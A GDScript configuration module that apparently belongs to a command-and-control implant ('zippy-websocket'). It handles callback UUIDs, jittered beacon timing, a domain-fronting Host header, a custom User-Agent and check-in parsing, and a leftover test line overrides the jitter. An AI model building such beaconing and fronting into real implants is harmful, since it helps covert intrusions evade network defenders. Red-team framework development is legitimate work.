extends Node

enum TRANSPORT_TYPE {WEBSOCKET, HTTP, TCP}
const TransportWebsocket = preload("res://transport/websocket.gd")

const FILE_NAME = "res://config_zippy-websocket.json"
const MAX_CONNECT_ATTEMPT = 3

var setting = {}

var rng

@export var sleep_time:int = 0

func _ready():
	rng = RandomNumberGenerator.new()
	rng.randomize()

	if FileAccess.file_exists(FILE_NAME):
		var file = FileAccess.open(FILE_NAME, FileAccess.READ)

		var test_json_conv = JSON.new()
		test_json_conv.parse(file.get_as_text())
		var data = test_json_conv.get_data()

		file.close()

		if typeof(data) == TYPE_DICTIONARY:
			print("config: ", data)
			setting = data
		else:
			printerr("Corrupted data!")
	else:
		printerr("No saved data!")

func should_encrypt():
	return false # TODO: implement

func get_verify():
	if setting.has("tls_verify"):
		return setting.get("tls_verify")

	return false

func get_payload_uuid():

	if setting.has("payload_uuid"):
		return setting.get("payload_uuid")

	return ""

func get_callback_uuid():

	if setting.has("callback_uuid"):
		return setting.get("callback_uuid")

	return ""

func set_callback_period(period:int):
	setting["callback_interval"] = int(period)

func get_callback_wait_time():

	var callback_period = 10 # unit seconds
	var callback_jitter = 5 # unit seconds

	if setting.has("callback_interval"):
		callback_period = int(setting.get("callback_interval"))

	if setting.has("callback_jitter"):
		callback_jitter = int(setting.get("callback_jitter"))

	if callback_jitter > callback_period:
		callback_period = callback_jitter # TODO: can we do better than this?

	var rr = rng.randi() % callback_period*1.1
	
	if rr < callback_jitter/1.2:
		rr *=-1
	
	var wait_time = callback_period + rr

	if wait_time <= 0:
		wait_time = 1
	
	wait_time += sleep_time

	wait_time = 2#  TODO nuke this once we're done testing...

	sleep_time = 0

	return wait_time

func get_headers():
	var headers = PackedStringArray()

	if setting.has("USER_AGENT") and not setting.get("USER_AGENT").is_empty():
		headers.append("User-Agent: %s" %  setting.get("USER_AGENT"))

	if setting.has("domain_front") and not setting.get("domain_front").is_empty():
		headers.append("Host: %s" %  setting.get("domain_front"))

	return headers

func get_callback_uri():
	var callback_host = ""

	if setting.has("callback_host"):
		callback_host += setting.get("callback_host")

	if setting.has("callback_port"):
		callback_host += ":%s" % String(setting.get("callback_port"))

	if setting.has("ENDPOINT_REPLACE"):
		callback_host += "/%s" % setting.get("ENDPOINT_REPLACE")

	return callback_host

func set_callback_uuid(uuid):
	setting["callback_uuid"] = uuid

func get_transport(transport, agent):
	var uri = get_callback_uri()

	if uri.begins_with("ws"):
		return TransportWebsocket.new($".", agent, transport)	

	return null

func is_checkin_complete():
	return get_callback_uuid() != ""
		

func get_uuid():
	var uuid = get_payload_uuid()

	if is_checkin_complete():
		uuid = get_callback_uuid()

	return uuid

func parse_checkin(data):
	# TODO: enc/dec key parsing / init?
	set_callback_uuid(data.get("payload").get("id"))
